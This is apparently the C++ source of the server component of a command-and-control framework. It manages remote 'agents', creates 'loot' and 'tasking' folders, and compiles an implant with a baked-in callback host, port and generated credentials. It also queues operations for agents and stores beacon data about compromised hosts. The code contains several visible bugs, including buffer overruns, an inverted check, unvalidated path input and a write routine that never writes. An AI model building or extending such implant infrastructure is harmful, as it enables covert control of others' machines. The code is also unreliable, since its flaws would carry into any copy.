#include "agents.h"
#include "misc.h"
#include "authenticate.h"

AgentInformationHandler::AgentInformationHandler(){

}

AgentInformationHandler::~AgentInformationHandler(){

}


int AgentInformationHandler::init(char *agent_id){
    FILE *manifest = NULL;
    char parent_dir[2048];
    char tmp_buff[BUFSIZ];
    char *tmp = NULL;
    char *buff = NULL;
    int rc = 0;

    // TODO: Server is not correctly passing the agent ID to this function on first connection
    memset(parent_dir, 0, sizeof(parent_dir));
    memset(tmp_buff, 0, sizeof(tmp_buff));
    printf("Agent ID: %s\n", agent_id);
    sprintf(parent_dir, "%s/agents/%s", getcwd(tmp_buff, sizeof(tmp_buff)), agent_id);
    printf("Parent directory: %s\n", parent_dir);
    buff = strdup(parent_dir);
    tmp = strdup(parent_dir);
    rc = mkdir(parent_dir, 0755);
    if(rc != 0){
        perror("");
        return 1;
    }
    mkdir(strcat(parent_dir, "/loot"), 0755);
    mkdir(strcat(tmp, "/tasking"), 0755);

    manifest = fopen(strcat(buff, "/agent.mfst"), "w");
    fwrite("NULL :)", 1, sizeof("NULL :)"), manifest);
    fclose(manifest);
    AgentInformationHandler::write_info(agent_id, NULL, NULL, NULL, NULL, NULL);

    return 0;
}

int AgentInformationHandler::register_agent(char *username, char *password){
    FILE *file;
    file = fopen(DATA_FILE, "a");
    if (!file)
    {
        printf("Failed to open file thing\n");
        fclose(file);
        return 1;
    }
    fseek(file, 0L, SEEK_END);
    fwrite("\n", 1, 1, file);
    fwrite(username, 1, strlen(username), file);
    fwrite(":", 1, 1, file);

    char *buff;
    buff = Authenticate::digest(password);

    fwrite(buff, 1, strlen(buff), file);
    fclose(file);
    return 0;
}


char *AgentInformationHandler::get_tasking(char *agent_id){
    char file[2048];
    char cwd_buf[BUFSIZ];
    char *mem_dump = NULL;
    int size = 0;
    FILE *fd = NULL;
    
    memset(cwd_buf, 0, sizeof(cwd_buf));
    memset(file, 0, sizeof(file));
    sprintf(file, "%s/agents/%s/agent.mfst", getcwd(cwd_buf, sizeof(cwd_buf)),agent_id);
    printf("Opening file %s\n", file);
    
    fd = fopen(file, "rb");
    if(fd == NULL) return NULL;
    
    fseek(fd, 0L, SEEK_END);
    size = ftell(fd);
    rewind(fd);
    
    mem_dump = (char *)malloc(size+1);
    memset(mem_dump, 0, size+1);
    fread(mem_dump, 1, size, fd);
    
    fclose(fd);
    //write_format(file);
    return mem_dump;
}

pPasswd AgentInformationHandler::gen_creds(){
    struct ret *buf = (struct ret *) malloc(sizeof(struct ret));
    memset(buf, 0, sizeof(struct ret));
    char *usr = (char *)malloc(13);
    memset(usr, 0, 13);
    char *pwd = (char *)malloc(13);
    memset(usr, 0, 13);

    usr[13] = '\0';
    pwd[13] = '\0';

    buf->usr = usr;
    buf->passwd = pwd;


    for(int i = 0; i < 12; i++){
        usr[i] = 'A' + (random() % 26);
    }

    for(int i = 0; i < 12; i++){
        pwd[i] = 'A' + (random() % 26);
    }

    return buf;
}

int AgentInformationHandler::compile(char *ip, char *port){
    // In here the agent file header is editeed and recompiled against these values
    // Also in here is where the username and password are added to the server database
    
    // move over the required source files
    char buff[BUFSIZ];
    memset(buff, 0, sizeof(buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "client.c");
    misc_copy_file(buff, "out/client.cpp");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "agent.h");
    misc_copy_file(buff, "out/agent.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "agent.c");
    misc_copy_file(buff, "out/agent.cpp");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "b64.h");
    misc_copy_file(buff, "out/b64.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "b64.c");
    misc_copy_file(buff, "out/b64.cpp");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "beacon.h");
    misc_copy_file(buff, "out/beacon.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "beacon.c");
    misc_copy_file(buff, "out/beacon.cpp");

    memset(buff, 0, sizeof(buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "examples_common.h");
    misc_copy_file(buff, "out/examples_common.h");

    // create config file

    struct ret *struc = AgentInformationHandler::gen_creds();

    printf("Agent Credentials:\n\tUser: %s, Password: %s\n", struc->usr, struc->passwd);

    memset(buff, 0, sizeof(buff));


    snprintf(buff, BUFSIZ, "#define HOST \"%s\"\n#define PORT %s\n#define GLOB_ID \"%s\"\n#define GLOB_LOGIN \"%s\"\n", ip, port, struc->usr, struc->passwd);

    FILE *fd = NULL;
    fd = fopen("out/config.h", "w");
    if (!fd)
    {
        printf("Failed to open  the config header file\n");
        return 1;
    }
    
    fwrite(buff, 1, strlen(buff) -1, fd);
    fclose(fd);

    printf("Compiling agent...\n");
    system(COMPILE);

    AgentInformationHandler::register_agent(struc->usr, struc->passwd);
    printf("Agent successfully compiled! Check the 'out/' directory for the client executable\n");
    return 0;
}

int AgentInformationHandler::task(int operation, char *agent, char *opt){
    FILE *file = NULL;
    char buffer[BUFSIZ];
    char tmpbuff[BUFSIZ];

    memset(buffer, 0, sizeof(buffer));
    printf("Agent: %s, Filename: %s\n", agent,opt);
    sprintf(buffer, "%s/agents/%s/agent.mfst", getcwd(tmpbuff, sizeof(tmpbuff)), agent);
    
    file = fopen(buffer, "a");
    if(!file){
        perror("Server failed to read agent tasking file");
        return 1;
    }
    
    printf("Server: Tasking %s with operation %d\n", agent, operation);
    
    memset(tmpbuff, 0, sizeof(tmpbuff));
    sprintf(tmpbuff, "%d|%s\n", operation, opt);
    fwrite(tmpbuff, 1, strlen(tmpbuff), file);
    fclose(file);
    
    return 0;
}

int AgentInformationHandler::write_beacon(char *id, char *beacon){
    FILE *fd = NULL;
    char buff[2048];
    char cwd[BUFSIZ];

    memset(buff, 0, sizeof(buff));
    memset(cwd, 0, sizeof(cwd));

    sprintf(buff, "%s/agents/%s/info.txt", getcwd(cwd, sizeof(cwd)), id);

    fd = fopen(buff, "w");
    if (fd == NULL)
    {
        perror("");
        return 1;
    }
    
    fwrite(beacon, 1,strlen(beacon), fd);
    fclose(fd);

    return 0;
}

int AgentInformationHandler::write_info(char *id, char *connection_time, char *hostname, char *ip_addr, char *interfaces, char *proc_owner){
    char buff[BUFSIZ];
    char *na = "NA";
    FILE *fd = NULL;

    memset(buff, 0, sizeof(buff));
    sprintf(buff, "agents/%s/info.txt", id);
    
    fd = fopen(buff, "w");
    if(fd == NULL){
        perror("");
        return 1;
    }
    
    memset(buff, 0, sizeof(buff));
    
    if(id == NULL){
        id = na;
    }

    if(connection_time == NULL){
        connection_time = na;
    } 

    if(hostname == NULL){
        hostname = na;
    }

    if(ip_addr == NULL){
        ip_addr = na;
    }

    if(interfaces == NULL){
        interfaces = na;
    }

    if(proc_owner != NULL){
        proc_owner = na;
    } 

    sprintf(buff, "%s\n%s\n%s\n%s\n%s\n%s\n", id, connection_time, hostname, ip_addr, interfaces, proc_owner);

    fclose(fd);

    return 0;
}

int AgentInformationHandler::write_format(char *path){
    FILE *fd;

    fd = fopen(path, "w");
    if (!fd)
    {
        perror("");
        return 1;
    }
    
    fwrite("NULL :)\n", 1, sizeof("NULL :)"), fd);
    fclose(fd);
    return 0;
}
